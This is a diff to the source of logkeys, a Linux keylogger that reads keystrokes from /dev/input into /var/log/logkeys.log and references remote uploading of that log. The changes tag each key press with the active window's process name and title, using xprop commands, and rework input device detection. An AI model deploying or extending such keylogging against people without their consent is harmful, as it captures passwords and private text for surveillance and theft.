@@ -23,8 +23,6 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <linux/input.h>
-///added
-#include <X11/Xlib.h>
 
 #ifdef HAVE_CONFIG_H
 # include <config.h>  // include config produced from ./configure
@@ -48,11 +46,14 @@
 #endif
 
 #define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
-////added 3 lines -maybe unnecessary
-#define COMMAND_STR_DEVICES    EXE_GREP " Name /proc/bus/input/devices | " EXE_GREP " -nE "
-#define COMMAND_STR_DEVICES1 ( COMMAND_STR_DEVICES "'[Kk]eyboard|kbd'" )
-#define COMMAND_STR_DEVICES2 ( COMMAND_STR_DEVICES "'HID'" )
 #define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )
+
+#define COMMAND_STR_DEVICE    EXE_GREP " -E 'Handlers|EV' /proc/bus/input/devices | " EXE_GREP " -B1 120013 | " EXE_GREP " -Eo event[0-9]+"
+
+// active window id, title, name
+#define COMMAND_STR_AWID    "xprop -root 32x '\\t$0' _NET_ACTIVE_WINDOW | cut -f 2"
+#define COMMAND_STR_AWTITLE "xprop -id $(" COMMAND_STR_AWID ") _NET_WM_NAME  | awk '{print $3}'"
+#define COMMAND_STR_AWPNAME "xprop -id $(" COMMAND_STR_AWID ") WM_CLASS | awk '{print $4}' | sed 's:^.\\(.*\\).$:\\1:'"
 
 #define INPUT_EVENT_PATH  "/dev/input/"  // standard path
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
@@ -64,31 +65,6 @@
 #include "upload.cc"     // functions concerning remote uploading of log file
 
 namespace logkeys {
-////added made myself
-std::string get_current_window_name()
-{
-    Display *display;
-  Window focus;
-  int revert;
-  char *window_name;
-
-  //getcurrentwindowname
-  display = XOpenDisplay(NULL);
-  if(XGetInputFocus(display, &focus, &revert)==0)
-    return "{}";
-  if(XFetchName(display, focus, &window_name)==0)
-    return "{}";
-
-  std::string result(window_name);
-
-    return "{"+result+"}";
-}
-bool check_if_number(const std::string& s)
-{
-    std::string::const_iterator it = s.begin();
-    while (it != s.end() && std::isdigit(*it)) ++it;
-    return !s.empty() && it == s.end();
-}
 
 // executes cmd and returns string ouput
 std::string execute(const char* cmd)
@@ -104,6 +80,36 @@ std::string execute(const char* cmd)
     pclose(pipe);
     return result;
 }
+
+////old version that needs #include <X11/Xlib.h>
+/* 
+std::string get_current_window_name()
+{
+  
+  std::string result = execute(COMMAND_STR_AWPNAME);
+
+  return "{"+result+"}";
+
+
+  ////old version, X11 needed
+  Display *display;
+  Window focus;
+  int revert;
+  char *window_name;
+  std::string result;
+
+  //getcurrentwindowname
+  display = XOpenDisplay(NULL);
+  if(XGetInputFocus(display, &focus, &revert)==0)
+    return "{}";
+  if(XFetchName(display, focus, &window_name)==0)
+    return "{}";
+
+  result = window_name;
+
+  return "{"+result+"}";
+}*/
+////
 
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
@@ -361,19 +367,8 @@ void determine_input_device()
   setegid(65534); seteuid(65534);
   
   // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
-  ////added es index ==-1 stott results.size()....
-  /*std::string output = execute(COMMAND_STR_DEVICES1);
-
-  int index = atoi(output.c_str()) - 1;
-  if (index == -1) {
-    output = execute(COMMAND_STR_DEVICES2);
-    index = atoi(output.c_str()) - 1;
-  }
-  if (index == -1) {*/
   // The compiler automatically concatenates these adjacent strings to a single string.
-  const char* cmd = EXE_GREP " -E 'Handlers|EV=' /proc/bus/input/devices | "
-    EXE_GREP " -B1 'EV=1[02]001[3Ff]' | "
-    EXE_GREP " -Eo 'event[0-9]+' ";
+  const char* cmd = COMMAND_STR_DEVICE;
   std::stringstream output(execute(cmd));
   
   std::vector<std::string> results;
@@ -511,22 +506,16 @@ int main(int argc, char **argv)
   if (args.flags & FLAG_NO_TIMESTAMPS)
     file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
   else
-    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
-  ////addded
-  /*strftime(timestamp, sizeof(timestamp), "%z", localtime(&cur_time));
-    file_size += fprintf(stdout, "Logging started UTC %s (100=1h)...\n\n%s", timestamp);
-  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));*/
-  fflush(out);
-
-  ////various strings to store the window name 
-  std::string curr_process_name, 
-    cur_window_name, 
-    program_name, 
-    old_window_id, 
-    window_id;
-  bool window_changed = false, 
-    first_start = true;
+    file_size += fprintf(out, "Logging started ...\n\n");
   
+  fflush(out);
+  
+  std::string window_id;
+  std::string old_window_id;
+  std::string cur_process_name; 
+  std::string cur_window_name;
+  std::string program_info;
+
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
     
@@ -598,38 +587,28 @@ int main(int argc, char **argv)
       }
       count_repeats = 0;  // reset count for future use
     }
-    
+
     // on key press
     if (event.value == EV_MAKE) {
-      ////added
-      if (!first_start) {
-        window_id = execute("getwindowpid $(xdotool getwindowfocus)");
-        if (check_if_number(window_id))  ////better 
-          curr_process_name = execute("tr -d '\n' < /proc/"+window_id+"/comm"); //update curr_process_name
-        else
-          curr_process_name = "unknown pid"; ////is this even possible
+      //// write [process name] "process title" >
+      window_id = execute(COMMAND_STR_AWID);
+      if (window_id.compare(old_window_id) != 0) { // diff window
+        cur_process_name = execute(COMMAND_STR_AWPNAME);
+        cur_window_name = execute(COMMAND_STR_AWTITLE);
+        program_info = "[" + cur_process_name.erase(cur_process_name.size() - 1) + "] " + cur_window_name.erase(cur_window_name.size() - 1) + " > "; // delete newline (why are newlines)
+        inc_size += fprintf(out, "%s%s", timestamp, program_info.c_str());  // then newline and timestamp 
       }
-      if (!first_start && (window_id != old_window_id)) {
-        cur_window_name = get_current_window_name();
-        program_name = "["+curr_process_name+"]"+cur_window_name+ " > ";
-        window_changed = true;
-      }
-      else
-        window_changed = false;
 
-      if (window_changed)
-        inc_size += fprintf(stdout, "%s%s", timestamp, program_name.c_str());  // then newline and timestamp 
-      
       // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
       if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
           (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
         if (ctrl_in_effect)
           inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
         if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "%s\n", program_name.c_str())
+          inc_size += fprintf(out, "%s\n", program_info.c_str());
         else {
           strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s%s", timestamp, program_name.c_str());  // then newline and timestamp 
+          inc_size += fprintf(out, "%s%s", timestamp, program_info.c_str());  // then newline and timestamp 
         }
         if (inc_size > 0) file_size += inc_size;
         continue;  // but don't log "<Enter>"
@@ -668,13 +647,12 @@ int main(int argc, char **argv)
         if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
           inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
         } 
-        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) { ////shouldn tab be separate
+        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) { //// shouldn't tab get an extra function key code?
           inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
         }
       }
       else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
-      ////added
-      first_start = false;
+      
       old_window_id = window_id;
     } // if (EV_MAKE)
     
